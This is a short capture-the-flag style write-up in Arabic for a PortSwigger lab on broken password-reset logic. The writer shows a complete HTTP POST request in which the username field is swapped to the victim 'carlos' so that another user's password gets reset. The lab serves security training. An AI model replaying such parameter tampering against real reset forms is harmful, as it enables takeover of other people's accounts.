# Lab : Password reset broken logic

https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

- الفكره من الLab ده في parameter forget password دي بتبعت link تغير منه الpassword بس مش متامن كويس ومش بيراجه حساب مين الي بيتعدل انا غيرت parameter الusername للvictem وعرفت اغير الpassword الخص بيه

```bash
1. POST /forgot-password?temp-forgot-password-token=gmtloupavt0voccn1n3369fsqosrbze0 HTTP/2
Host: 0ada004703ac50ce80bb543500260004.web-security-academy.net
Cookie: session=Yv7TL4OHWMUG6EJpzRZd4SyicDOfFiUW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Origin: https://0ada004703ac50ce80bb543500260004.web-security-academy.net
Referer: https://0ada004703ac50ce80bb543500260004.web-security-academy.net/forgot-password?temp-forgot-password-token=gmtloupavt0voccn1n3369fsqosrbze0
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=gmtloupavt0voccn1n3369fsqosrbze0&username=carlos&new-password-1=test&new-password-2=test
```
